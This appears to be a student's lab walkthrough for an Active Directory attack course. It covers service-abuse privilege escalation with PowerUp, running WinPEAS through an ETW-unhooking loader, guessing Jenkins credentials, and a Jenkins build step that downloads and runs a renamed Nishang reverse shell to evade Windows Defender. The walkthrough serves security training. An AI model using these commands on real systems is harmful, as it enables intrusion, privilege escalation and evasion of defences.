# Learning Objetive 5

<figure><img src="../../../.gitbook/assets/image (14) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (21) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

* Student VM : Service abused on the student VM for local privilege escalation

Local Privilege Escalation - PowerUp

We can use Powerup from PowerSploit module to check for any privilege escalation path. Feel free to use other tools mentioned in the class like WinPEAS.

### InviShell

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerUp.ps1
```

### Enumeration - Local Privilege Escalation

<pre><code>Invoke-AllChecks

[*] Checking for unquoted service paths...

ServiceName : AbyssWebServer
Path : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer;
IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName : LocalSystem
AbuseFunction : Write-ServiceBinary -Name 'AbyssWebServer' -Path

CanRestart : True
ServiceName : AbyssWebServer
Path : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer;
IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName : LocalSystem
AbuseFunction : Write-ServiceBinary -Name 'AbyssWebServer' -Path

CanRestart : True
[snip]

[*] Checking service executable and argument permissions...

ServiceName : AbyssWebServer
Path : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiableFile : C:\WebServer\Abyss Web Server
ModifiableFilePermissions : {WriteOwner, Delete, WriteAttributes,
Synchronize...}
ModifiableFileIdentityReference : Everyone
<strong>StartName : LocalSystem
</strong>AbuseFunction : Install-ServiceBinary -Name
'AbyssWebServer'
CanRestart : True
[snip]

[*] Checking service permissions...

ServiceName : AbyssWebServer
Path : C:\WebServer\Abyss Web Server\abyssws.exe -service
StartName : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'AbyssWebServer'
CanRestart : True
ServiceName : SNMPTRAP
Path : C:\Windows\System32\snmptrap.exe
StartName : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'SNMPTRAP'
CanRestart : True
</code></pre>

Let's use the abuse function for Invoke-ServiceAbuse and add our current domain user to the local Administrators group.

```
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student113' -Verbose
```

<figure><img src="../../../.gitbook/assets/image (22) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can see that the dcorp\studentx is a local administrator now. Just logoff and logon again and we have local administrator privileges!

***

## Local Privilege Escalation - WinPEAS

You can use WinPEAS using the following command. Note that we use an obfuscated version of WinPEAS:

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args notcolor log
```

```
C:\AD\Tools>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args  notcolor log
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\winPEASx64.exe Arguments : notcolor log
?[1;32m"log" argument present, redirecting output to file "out.txt"?[0m
```

Spend some time analyzing the output of WinPEAS. For the lab, you will find useful information in the 'Services Information' section of the output:

```
????????????????????????????????????? Services Information ?????????????????????????????????????

???????????? Interesting Services -non Microsoft-
? Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
    AbyssWebServer(Aprelium - Abyss Web Server)[C:\WebServer\Abyss Web Server\abyssws.exe -service] - Auto - Stopped - No quotes and Space detected
    YOU CAN MODIFY THIS SERVICE: AllAccess
    File Permissions: Everyone [AllAccess]
    Possible DLL Hijacking in binary folder: C:\WebServer\Abyss Web Server (Everyone [AllAccess], Users [AppendData/CreateDirectories WriteData/CreateFiles])

[snip] 

???????????? Modifiable Services
? Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
    AbyssWebServer: AllAccess
    RmSvc: GenericExecute (Start/Stop)
    SNMPTRAP: AllAccess
        [snip]

```

***

## Local Privilege Escalation - PrivEscCheck

Similarly, we can use PrivEscCheck (https://github.com/itm4n/PrivescCheck) for a nice summary of possible privilege escalation opportunities:

```
. C:\AD\Tools\PrivEscCheck.ps1
```

```
Invoke-PrivescCheck
```

<figure><img src="../../../.gitbook/assets/image (23) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

### Hunt for Local Admin access

* Student VM : Script used for hunting for admin privileges using PowerShell Remoting

Now for the next task, to identify a machine in the domain where studentx has local administrative access, use Find-PSRemotingLocalAdminAccess.ps1:

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

```
Find-PSRemotingLocalAdminAccess
```

<figure><img src="../../../.gitbook/assets/image (24) (1) (1).png" alt=""><figcaption></figcaption></figure>

So... studentx has administrative access on dcorp-adminsrv and on the student machine. We can connect to dcorp-adminsrv using winrs as the student user:

```
winrs -r:dcorp-adminsrv cmd
```

<figure><img src="../../../.gitbook/assets/image (25) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
set username
set computername
```

<figure><img src="../../../.gitbook/assets/image (27) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### We can also use PowerShell Remoting:

> Note: Remenber use a new invishell

```
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
## After
$env:username
```

<figure><img src="../../../.gitbook/assets/image (28) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

* dcorp-ci : Jenkins user used to access Jenkins web console

## Abuse Jenkins Instance

Next, let's try our hands on the Jenkins instance. To be able to execute commands on Jenkins server without admin access we must have privileges to Configure builds. We have a misconfigured Jenkins instance on dcorp-ci (http://172.16.3.11:8080). If we go to the "People" page of Jenkins we can see the users present on the Jenkins instance.

> Note: Remember to use Edge to open the Jenkins web console!

<figure><img src="../../../.gitbook/assets/image (29) (1) (1).png" alt=""><figcaption></figcaption></figure>

Since Jenkins does not have a password policy many users use username as passwords even on the publicly available instances. By manually trying the usernames as passwords we can identify that the user builduser has password builduser. The user builduser can Configure builds and Add Build Steps which will help us in executing commands.

<figure><img src="../../../.gitbook/assets/image (30) (1).png" alt="" width="563"><figcaption></figcaption></figure>

`builduser : builduser`

Use the encodedcomand parameter of PowerShell to use an encoded reverse shell or use download execute cradle in Jenkins build step. You can use any reverse shell, below we are using a slightly modified version of Invoke-PowerShellTcp from Nishang.

We renamed the function Invoke-PowerShellTcp to Power in the script to bypass Windows Defender.

If using Invoke-PowerShellTcp, make sure to include the function call in the script Power -Reverse -IPAddress 172.16.100.X -Port 443 or append it at the end of the command in Jenkins. Please note that you may always like to rename the function name to something else to avoid detection.

```
powershell.exe iex (iwr http://172.16.100.113/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.113 -Port 443
```

<figure><img src="../../../.gitbook/assets/image (31) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (32) (1).png" alt="" width="440"><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (33) (1).png" alt="" width="551"><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

```
powershell.exe iex (iwr http://172.16.100.113/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.113 -Port 443
```

> Double check the following:
>
> 1. Remember to host the reverse shell on a local web server on your student VM. You can find hfs.exe in the C:\AD\Tools directory of your student VM. Note that HFS goes in the system tray when minimized. You may like to click the up arrow on the right side of the taskbar to open the system tray and double-click on the HFS icon to open it again.
> 2. Also, make sure to add an exception or turn off the firewall on the student VM.
> 3. Check if there is any typo or extra space in the Windows Batch command that you used above in the Jenkins project.
> 4. After you build the project below, check the 'Console Output' of the Jenkins Project to know more about the error.

### Share a folder with Invoke-PowerShellTcp

Fristly, execute HFS to enable the share -->

<figure><img src="../../../.gitbook/assets/image (35) (1).png" alt=""><figcaption></figcaption></figure>

After, upload the Invoke-PowerShellTcp.ps1 -->

<figure><img src="../../../.gitbook/assets/image (36) (1).png" alt=""><figcaption></figcaption></figure>

> Note: There is the route to copy and paste in the command:
>
> powershell.exe iex (iwr _**http://172.16.100.113/Invoke-PowerShellTcp.ps1**_ -UseBasicParsing); ...

Once we have the payload and share run, <mark style="background-color:yellow;">remember to host turn off the Windows Firewall</mark>

<figure><img src="../../../.gitbook/assets/image (38) (1).png" alt=""><figcaption></figcaption></figure>

***

Once all it's done, check the visibility with the share, run the build and see the log -->

<figure><img src="../../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

> Note: If you have issues, reboot the machine

Nice! One we have visibility, weak up the netcat and execute it again-->

```
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
```

<figure><img src="../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

We can now run commands on the reverse shell:

```
$env:username
```

```
ipconfig
```

```
$env:computername
```

<figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
